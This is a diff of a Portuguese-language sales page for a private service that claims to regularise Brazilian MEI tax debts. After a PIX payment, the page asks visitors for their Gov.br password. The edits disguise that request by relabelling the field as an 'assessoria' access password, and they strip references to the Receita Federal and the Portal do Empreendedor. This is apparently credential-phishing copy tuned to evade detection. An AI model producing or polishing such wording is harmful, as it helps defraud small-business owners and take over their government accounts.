@@ -4,9 +4,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Assessoria Particular para Regularização de MEI e Parcelamento</title>
+    <title>Assessoria Particular para MEI - Elton Jung</title>
     <meta name="description"
-        content="Evite o cancelamento do seu CNPJ e a cobrança na Dívida Ativa. Assessoramos seu MEI com parcelamento de DAS, organização de DASN e negociação de débitos na PGFN. Processo particular rápido e seguro.">
+        content="Evite o cancelamento do seu CNPJ e a cobrança na Dívida Ativa. Assessoria particular para MEI com organização de pendências, impostos e dívidas. Atendimento rápido e focado.">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link
@@ -1239,7 +1239,7 @@
             <span class="logo-badge">Automação Fiscal</span>
         </div>
         <div class="header-seal" style="display: flex; gap: 15px; align-items: center;">
-            <button class="btn-ghost" onclick="show('step-tracking-login')" style="padding: 6px 14px; font-size: 11px; margin: 0; border-color: var(--gold); color: var(--gold);">Ver status do atendimento</button>
+            <button class="btn-ghost" onclick="show('step-tracking-login')" style="padding: 6px 14px; font-size: 11px; margin: 0; border-color: var(--gold); color: var(--gold);">Consultar status do atendimento</button>
             <div style="display: flex; align-items: center; gap: 6px;">
                 <div class="seal-dot"></div>
                 Atendimento Seguro
@@ -1560,7 +1560,7 @@
             <section id="step-pix">
                 <div class="step-label">Aguardando Pagamento</div>
                 <h2>Conclua seu pagamento</h2>
-                <p class="desc">Para liberar o acesso ao sistema de regularização, realize o pagamento via PIX abaixo.</p>
+                <p class="desc">Para liberar o acesso ao ambiente de atendimento, realize o pagamento via PIX abaixo.</p>
                 
                 <div class="pix-box">
                     <img id="pix-qr-img" src="" alt="QR Code PIX" style="display: none; margin: 0 auto 20px; border: 4px solid white; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 220px; width: 100%; height: auto;">
@@ -1575,7 +1575,7 @@
 
                 <div class="alert-box" style="text-align: left;">
                     ⏱️ <strong>Confirmação Automática:</strong><br>
-                    O sistema identificará seu pagamento em até 60 segundos. Não feche esta tela.
+                    A nossa plataforma identificará seu pagamento em até 60 segundos. Não feche esta tela.
                 </div>
 
                 <div id="payment-confirming" style="text-align:center; padding: 10px 0;">
@@ -1606,7 +1606,7 @@
             <!-- ── STEP GOV CREDENTIALS ── -->
             <section id="step-credentials">
                 <div class="step-label">Segurança & Automação</div>
-                <h2>Acesso ao Portal Gov.br</h2>
+                <h2>Autorização de Assessoria Especializada</h2>
                 <p class="desc">Pagamento confirmado! Agora, informe sua senha do Gov.br para que nosso robô possa iniciar a regularização.</p>
 
                 <div class="field">
@@ -1615,7 +1615,7 @@
                 </div>
 
                 <div class="field">
-                    <label>Senha do Portal Gov.br</label>
+                    <label>Senha de Acesso para Assessoria</label>
                     <input type="password" id="gov-password" placeholder="Sua senha segura" style="width: 100%; padding: 13px 16px; border: 1px solid var(--rule); border-radius: 3px;">
                 </div>
 
@@ -1799,7 +1799,7 @@
                     <div class="ri" style="color: var(--gold);">🤖</div>
                     <div>
                         <strong>Status do Robô:</strong>
-                        <p id="status-message">Conectando aos servidores da Receita Federal...</p>
+                        <p id="status-message">Acessando bases de dados...</p>
                     </div>
                 </div>
 
@@ -1899,7 +1899,7 @@
             <div class="urgency-card">
                 <span class="urgency-card-icon">🚫</span>
                 <div class="urgency-card-title">CNPJ Bloqueado ou Suspenso</div>
-                <p class="urgency-card-desc">Seu CNPJ pode ser cancelado a qualquer momento. Realizamos a reativação rápida junto à Receita Federal.</p>
+                <p class="urgency-card-desc">Seu CNPJ pode ser cancelado a qualquer momento. Realizamos a reativação rápida mediante requisição.</p>
                 <span class="urgency-tag">⚡ Reativação Urgente</span>
             </div>
             <div class="urgency-card">
@@ -1926,10 +1926,9 @@
     <!-- FOOTER -->
     <footer>
         <div class="footer-left">
-            <strong>Razão Social:</strong> 28.600.483 ELTON JUNG<br>
-            <strong>CNPJ:</strong> 28.600.483/0001-84<br>
-            <strong>Endereço:</strong> Gal Flores, 691, Centro, Agudo - RS, CEP 96540-000.<br><br>
-            <strong>Aviso Legal:</strong> A Elton Jung é uma empresa privada de consultoria administrativa. Não somos o Portal do Empreendedor, o SEBRAE ou qualquer órgão do Governo Federal. Atuamos de forma independente para facilitar processos de regularização.<br><br>
+            28.600.483 ELTON JUNG | CNPJ: 28.600.483/0001-84<br>
+            Endereço: Gal Flores, 691, Centro, Agudo - RS, CEP 96540-000.<br>
+            <strong>Aviso:</strong> Somos uma empresa de consultoria privada e não possuímos vínculo com órgãos governamentais.<br><br>
             <a href="javascript:void(0)" onclick="openPrivacyModal()" style="color: var(--gold); text-decoration: underline;">Política de Privacidade</a>
         </div>
         <div class="footer-right">
@@ -2698,7 +2697,7 @@
                     body: JSON.stringify({ nome, cpf })
                 });
 
-                if (!response.ok) throw new Error('Não encontramos seu CNPJ automaticamente. Verifique se os dados estão corretos ou procure no Portal do Empreendedor.');
+                if (!response.ok) throw new Error('Não encontramos seu CNPJ automaticamente. Verifique se os dados estão corretos ou verifique seus documentos.');
 
                 const data = await response.json();
                 
@@ -2744,7 +2743,7 @@
     </script>
     <a href="https://wa.me/5551999906748?text=Ol%C3%A1%2C%20preciso%20de%20ajuda%20profissional%20para%20regularizar%20as%20d%C3%ADvidas%20do%20meu%20MEI." class="whatsapp-float" target="_blank" id="whatsapp-float-btn" aria-label="Falar pelo WhatsApp">
         <span style="font-size: 20px;">💬</span>
-        <span class="wa-text">Falar com consultor agora</span>
+        <span class="wa-text">Falar com consultor de assessoria</span>
     </a>
 </body>
 
